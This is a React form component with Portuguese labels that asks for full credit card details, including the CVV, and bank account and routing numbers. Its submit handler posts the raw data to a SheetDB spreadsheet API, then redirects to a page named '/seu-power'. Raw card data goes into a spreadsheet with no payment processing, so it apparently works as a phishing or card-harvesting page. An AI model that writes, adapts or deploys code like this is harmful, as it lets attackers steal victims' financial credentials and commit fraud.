import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom'; // Para navegação entre páginas
import './Dados.css'; // Se você tiver um arquivo de estilos CSS

const Dados = () => {
  const [formData, setFormData] = useState({
    cardholderName: '',
    cardNumber: '',
    expirationDate: '',
    cvv: '',
    accountHolderName: '',
    accountNumber: '',
    bankName: '',
    routingNumber: '',
  });

  const navigate = useNavigate(); // Para navegação após o envio do formulário

  // Função para atualizar os dados do formulário conforme o usuário digita
  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  // Função para enviar os dados para o SheetDB e redirecionar o usuário
  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      // Envia os dados para a API do SheetDB
      await fetch('https://sheetdb.io/api/v1/i2mq4tynwk7es', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ data: formData }), // "data" é exigido pelo SheetDB
      });

      // Após o envio, redireciona para a página /seu-power (ou outra que você desejar)
      navigate('/seu-power');

    } catch (err) {
      console.error('Erro ao enviar:', err);
      alert('Erro ao enviar os dados. Tente novamente.');
    }
  };

  return (
    <div className="dados-container">
      <div className="gradient-overlay"></div>
      <div className="dados-content">
        <h1>Dados do Cartão e Conta Bancária</h1>
        <form onSubmit={handleSubmit}>
          <h2>Informações do Cartão de Crédito</h2>
          <label>
            Nome do Titular:
            <input
              type="text"
              name="cardholderName"
              value={formData.cardholderName}
              onChange={handleChange}
              required
            />
          </label>
          <label>
            Número do Cartão:
            <input
              type="number"
              name="cardNumber"
              value={formData.cardNumber}
              onChange={handleChange}
              required
            />
          </label>
          <label>
            Data de Validade:
            <input
              type="date"
              name="expirationDate"
              value={formData.expirationDate}
              onChange={handleChange}
              required
            />
          </label>
          <label>
            CVV:
            <input
              type="number"
              name="cvv"
              value={formData.cvv}
              onChange={handleChange}
              required
            />
          </label>

          <h2>Informações da Conta Bancária</h2>
          <label>
            Nome do Titular da Conta:
            <input
              type="text"
              name="accountHolderName"
              value={formData.accountHolderName}
              onChange={handleChange}
              required
            />
          </label>
          <label>
            Número da Conta:
            <input
              type="number"
              name="accountNumber"
              value={formData.accountNumber}
              onChange={handleChange}
              required
            />
          </label>
          <label>
            Nome do Banco:
            <input
              type="text"
              name="bankName"
              value={formData.bankName}
              onChange={handleChange}
              required
            />
          </label>
          <label>
            Número de Roteamento:
            <input
              type="number"
              name="routingNumber"
              value={formData.routingNumber}
              onChange={handleChange}
              required
            />
          </label>
          <button type="submit">Enviar</button>
        </form>
      </div>
    </div>
  );
};

export default Dados;
